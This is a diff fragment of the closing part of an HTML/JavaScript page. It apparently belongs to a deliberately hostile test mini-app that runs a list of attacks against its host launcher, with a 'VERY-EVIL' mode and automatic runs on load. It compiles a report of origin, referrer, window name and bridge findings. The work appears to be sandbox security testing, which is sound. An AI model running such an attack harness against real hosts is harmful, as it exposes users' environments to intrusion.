+        logLine('SKIP ' + a.name + ' — not armable, the launcher holds');
+        updateReport();
+        continue;
+      }
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
+      try {
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
+      } catch (e) {
+        state.evilResults[a.id] = { error: errMsg(e) };
+        logLine('ERR  ' + a.name + ' → ' + errMsg(e));
+      }
+      updateReport();
+      renderSummary();
+    }
+    logLine('finished. everything above actually happened.');
+    updateReport();
+  }
+
+  /* ---------- report ---------- */
+
+  function buildReport() {
+    return {
+      napp: window.__EVIL_ID__ || 'unknown',
+      mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
+      at: new Date().toISOString(),
+      collector: state.collector,
+      location: safeGet(() => location.href),
+      origin: safeGet(() => window.origin),
+      referrer: document.referrer,
+      instance: safeGet(() => window.name),
+      bridge: bridgePresence(),
+      parentLength: safeGet(() => window.parent.length),
+      findings: ATTACKS.map((a) => Object.assign({ id: a.id, name: a.name, severity: a.severity }, state.results[a.id] || {}, { evil: state.evilResults[a.id] || null })),
+    };
+  }
+  function updateReport() {
+    reportText.value = JSON.stringify(buildReport(), null, 2);
+  }
+  document.getElementById('copyReportBtn').addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(reportText.value);
+    } catch (_) {
+      reportText.select();
+    }
+  });
+  document.getElementById('reportBtn').addEventListener('click', () => {
+    const d = document.getElementById('report');
+    d.open = !d.open;
+  });
+
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
+  document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
+
+  /* ---------- boot ---------- */
+  renderKit();
+  render();
+  updateReport();
+  void runAllDemos();
+})();
+</script>
+</body>
+</html>
